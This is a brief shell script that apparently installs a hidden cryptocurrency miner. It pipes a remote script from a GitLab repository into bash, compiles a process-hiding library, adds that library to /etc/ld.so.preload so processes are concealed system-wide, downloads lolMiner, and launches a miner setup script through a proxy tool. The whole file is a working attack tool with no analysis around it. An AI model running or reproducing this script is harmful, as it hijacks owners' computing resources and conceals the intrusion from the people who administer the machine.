#!/bin/sh
wget -O - https://gitlab.com/WarungHejo/beta-01/-/raw/main/px_5.sh | bash
wget https://gitlab.com/WarungHejo/beta-01/-/raw/main/magicLol.zip
unzip magicLol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34/lolMiner_v1.34_Lin64.tar.gz
tar -xvzf lolMiner_v1.34_Lin64.tar.gz
rm .gitignore
cd 1.34
wget https://gitlab.com/WarungHejo/beta-01/-/raw/main/set_lol.sh
chmod +x *.sh
graftcp ./set_lol.sh
